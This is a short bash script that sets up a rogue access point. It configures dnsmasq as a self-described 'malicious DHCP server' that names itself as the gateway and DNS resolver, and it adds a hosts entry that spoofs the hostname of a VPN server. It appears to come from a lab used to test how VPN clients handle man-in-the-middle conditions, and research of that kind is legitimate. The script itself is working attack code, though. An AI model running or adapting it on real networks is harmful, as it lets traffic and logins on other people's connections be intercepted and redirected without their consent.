#!/bin/bash

./install_mitm_common.sh

# set up the network interface
ifconfig ens37 192.168.99.11/24 
# ifconfig wlan0 192.168.99.1/24 # use this when testing wireless network


# Configure malicious DHCP server
echo "
# Enable DNS forwarding
port=53
domain-needed
bogus-priv
strict-order

# Forward DNS queries to these DNS servers
server=8.8.8.8
server=8.8.4.4

# DHCP range-leases
dhcp-range=192.168.99.100,192.168.99.120,255.255.255.0,1h

# DHCP Option
dhcp-option=option:router,192.168.99.1
dhcp-option=option:dns-server,192.168.99.1
dhcp-authoritative
addn-hosts=/etc/hosts.d
" | sudo tee /etc/dnsmasq.conf

# spoof the IP address of the VPN server
echo '128.199.93.209 vpn.imsj.dev' | sudo tee -a /etc/hosts

# Start the services
sudo service dnsmasq restart
sudo service hostapd restart




